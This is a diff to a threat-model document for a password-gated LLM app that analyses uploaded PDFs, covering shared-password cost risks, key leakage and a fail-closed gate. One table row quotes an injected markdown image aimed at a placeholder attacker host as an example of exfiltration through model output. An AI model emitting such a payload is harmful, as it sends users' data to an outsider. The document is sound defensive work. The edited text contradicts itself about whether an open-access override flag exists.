@@ -16,7 +16,10 @@ by regex, independently of the model.
 ## Scope
 
 One shared workspace, hosted by the project owner, shared by link with a few trusted peers, and
-gated by a shared password (Phase 7). No user accounts. All LLM calls use the owner's API key, so
+gated by a **single shared password**. No user accounts, and no roles: anyone who has the password
+has full access, **including the actions that spend API credits**. That is a deliberate
+simplification over the earlier view/upload split, and it moves the whole burden of limiting cost
+onto the daily caps. All LLM calls use the owner's API key, so
 cost abuse is a real threat and is treated as one. The repository is private.
 
 ## Threat model
@@ -30,6 +33,7 @@ cost abuse is a real threat and is treated as one. The repository is private.
 | Viewer's browser / data | **Markdown or HTML exfiltration** — injected `![](https://attacker/?data=…)` makes the browser send data out | Model output rendered in the UI | 3, 4 | Markdown image/link syntax and HTML tags are stripped from every model string; the app never renders report- or model-derived text with `st.markdown`, `st.write`, `st.html` or `unsafe_allow_html`, enforced by a test that fails if any appears | None known. This is why the ban is absolute rather than per-call-site: a rule a reviewer can check mechanically cannot rot as the UI grows |
 | Host and viewers | **Malicious PDF features** — embedded files, JavaScript, `/OpenAction`, `/Launch`, annotations | Uploaded PDF | 1b, 4 | Reported and counted, never executed. Nothing in the app opens, launches, fetches or renders anything found in a document; a test asserts no module makes outbound HTTP calls | The PDF is still parsed by PyMuPDF, so a parser vulnerability would be reachable. Mitigated only by keeping PyMuPDF pinned and current |
 | API key | **Key leakage** into git, logs, UI or errors | Repo, logs, error paths | 4 | Key lives only in `.env` (gitignored, never committed); it is not a field on any settings object but read on demand by `get_api_key()`; error messages name the variable, never the value; request bodies are never logged; gitleaks runs as a pre-commit hook and blocked a test key | A developer can still print it deliberately. Full-history gitleaks scan is a Phase 7 release gate |
+| API budget | **Password sharing** — the one password grants spending, so anyone given it for browsing can also spend | Shared link | cost controls | Daily caps on reports, agent runs and spend. This is the direct cost of collapsing the two roles into one and is accepted deliberately | Someone trusted with read access can spend up to the daily cap. Re-introducing a read-only role is the fix if that matters |
 | API budget | **Cost abuse** — a peer, or an attacker with the link, burns the owner's credits | Upload page | cost controls | No API call without an explicit click; worst-case cost shown first; at most `MAX_CHUNKS_PER_REPORT` (6) chunks per report; results cached by file hash so re-analysis is free; file capped at 5 MB and 50 pages; daily caps on reports, agent runs and spend, enforced race-free on both backends (SQL row lock on Supabase, process lock plus atomic write locally) | The estimate is reserved before the call and settled after, so a crash mid-call leaves spend over-counted rather than under-counted. On the local backend the counts reset when the container is wiped, so a deployment that restarts often has a weaker ceiling |
 | Graph integrity | **Concurrent overwrite** — two peers upload at once and one loses their work | Save path | storage | Optimistic version numbers: a stale save is rejected, then reloaded and re-merged onto the newer graph. Merging is idempotent, which is what makes the retry safe | After 3 failed attempts the user is asked to retry |
 | Graph integrity | Corrupt or truncated graph file | Save path | storage | Atomic writes (temp file, fsync, `os.replace`) so an interrupted save leaves the previous file intact; last 5 versions kept as restorable backups | Disk-level corruption outside the write path |
@@ -117,8 +121,9 @@ HIGH.
   for a model-based classifier such as Prompt Guard, but torch/transformers are deliberately not
   added: they would multiply install size and deployment cold-start for a layer that is not
   carrying the security argument.
-- **The gate fails closed.** If neither password is set, the app refuses to serve rather than
-  opening. This replaced a fail-open default, which is not a hypothetical: the first deployment of
+- **The gate fails closed.** If `APP_PASSWORD` is not set, the app refuses to serve rather than
+  opening. There is no open mode and no override flag, because an escape hatch would eventually
+  be set in a deployment by accident. This replaced a fail-open default, which is not a hypothetical: the first deployment of
   this project went live on a public URL with no gate and a working API key, so anyone with the
   link could have spent the owner's credits. Only the daily caps limited the exposure. Open access
   now requires `ALLOW_OPEN_ACCESS=true` to be set deliberately.
